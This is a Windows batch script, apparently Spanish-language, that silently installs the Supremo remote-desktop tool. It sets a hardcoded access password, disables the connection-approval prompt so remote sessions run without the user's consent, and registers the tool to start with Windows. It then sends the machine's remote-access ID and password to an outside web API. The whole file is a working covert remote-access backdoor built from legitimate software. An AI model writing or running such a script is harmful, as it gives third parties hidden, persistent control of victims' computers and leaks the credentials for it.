@echo off
title Instalador Supremo Invisible
color 0A

REM ========== CONFIGURACION ==========
set SUPREMO_PASS=Admin123456
set API_URL=https://esfm.vercel.app/api/codes
set INSTALL_PATH=C:\Program Files (x86)\Supremo

REM Verificar si ya esta instalado
if exist "%INSTALL_PATH%\Supremo.exe" (
    goto reconfigurar
)

:instalar
echo [1/6] Descargando Supremo...
powershell -Command "Invoke-WebRequest -Uri 'https://www.nanosystems.it/public/download/Supremo.exe' -OutFile '%TEMP%\Supremo.exe'"

if not exist "%TEMP%\Supremo.exe" (
    echo ERROR: No se pudo descargar Supremo
    pause
    exit
)

echo [2/6] Instalando Supremo...
mkdir "%INSTALL_PATH%" 2>nul
copy "%TEMP%\Supremo.exe" "%INSTALL_PATH%\Supremo.exe" >nul

goto configurar

:reconfigurar
echo Reconfigurando Supremo existente...
taskkill /F /IM Supremo.exe >nul 2>&1
taskkill /F /IM SupremoService.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:configurar
echo [3/6] Configurando contrasena...
echo %SUPREMO_PASS%| "%INSTALL_PATH%\Supremo.exe" -set-password
timeout /t 2 /nobreak >nul

echo [4/6] Desactivando confirmacion de conexion (ventana invisible)...
"%INSTALL_PATH%\Supremo.exe" -ask-authorization 0
timeout /t 2 /nobreak >nul

echo [5/6] Configurando inicio con Windows...
"%INSTALL_PATH%\Supremo.exe" -servicesetup
timeout /t 3 /nobreak >nul

echo [6/6] Obteniendo ID...
start "" "%INSTALL_PATH%\Supremo.exe"
timeout /t 5 /nobreak >nul

for /f "delims=" %%i in ('"%INSTALL_PATH%\Supremo.exe" /get-id 2^>nul') do set SUPREMO_ID=%%i

if "%SUPREMO_ID%"=="" (
    timeout /t 5 /nobreak >nul
    for /f "delims=" %%i in ('"%INSTALL_PATH%\Supremo.exe" /get-id 2^>nul') do set SUPREMO_ID=%%i
)

REM ========== ENVIAR A LA API ==========
echo Enviando a la API...
powershell -Command "$body = @{code='%SUPREMO_ID%'; password='%SUPREMO_PASS%'} | ConvertTo-Json; try { Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json' | Out-Null; Write-Output 'OK' } catch { Write-Output 'ERROR' }" > "%TEMP%\api_result.txt"
set /p API_RESULT=<"%TEMP%\api_result.txt"
del "%TEMP%\api_result.txt" >nul 2>&1

echo.
echo =============================================
echo   RESULTADO
echo =============================================
echo ID: %SUPREMO_ID%
echo Password: %SUPREMO_PASS%
echo API Result: %API_RESULT%
echo =============================================
echo.
echo Supremo configurado SIN ventana de confirmacion!
echo.

pause
